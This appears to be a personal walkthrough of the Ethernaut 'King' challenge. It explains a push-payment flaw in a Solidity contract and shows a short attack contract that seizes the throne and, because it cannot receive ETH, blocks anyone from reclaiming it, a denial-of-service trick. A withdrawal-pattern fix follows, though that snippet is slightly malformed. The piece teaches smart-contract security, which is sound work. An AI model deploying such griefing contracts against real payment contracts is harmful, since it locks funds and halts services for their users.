# Level 9: King

Date: January 29, 2026
Status: Done

## The Challenge

Become the king and prevent anyone (including Ethernaut) from reclaiming the throne.

## The Bug

The contract sends ETH to the previous king before updating state:
solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);  // Can fail
    king = msg.sender;                   // Never reached if transfer fails
    prize = msg.value;
}


If the transfer fails, the entire transaction reverts and the king doesn't change.

## How I Did It

Created an attack contract that:
1. Can send ETH (to become king)
2. CANNOT receive ETH (no receive/fallback)

contract KingAttack {
    function attack(address _king) external payable {
        (bool success, ) = _king.call{value: msg.value}("");
        require(success);
    }
    // NO receive() or fallback() = Can't receive ETH
}


When anyone tries to become king:
- Contract tries to send ETH to my contract
- My contract rejects it (no receive function)
- Transfer fails
- Transaction reverts
- King doesn't change
- I stay king forever

This is a **DoS (Denial of Service)** attack.

## Why It Matters

**Push vs Pull pattern:**

Push (BAD): Contract sends you money
- If transfer fails → Everything fails
- Can lock entire contract

Pull (GOOD): You withdraw your money
- If YOUR withdrawal fails → Only YOUR problem
- Doesn't affect others

**Real incidents:**
- King of the Ether (2016): Game permanently stuck
- Auction contracts: Bidding locked
- Payout contracts: Distributions blocked

## The Fix

Use withdrawal pattern:

mapping(address => uint) public pendingWithdrawals;

function becomeKing() external payable {
    require(msg.value >= prize);
 Store payout for old king
pendingWithdrawals[king] += msg.value;

// Update state first
king = msg.sender;
prize = msg.value;
}

function withdraw() external {
    uint amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}


Never let external call failure block critical state changes.

## What I Learned

1. DoS attack via failed transfers
2. Contracts can reject ETH (no receive/fallback)
3. .transfer()` reverts if recipient rejects
4. Pull > Push for payments
5. Always assume external calls can fail
6. Don't let failed calls block state updates

This is why withdrawal patterns are standard in modern DeFi.

9/29 done.
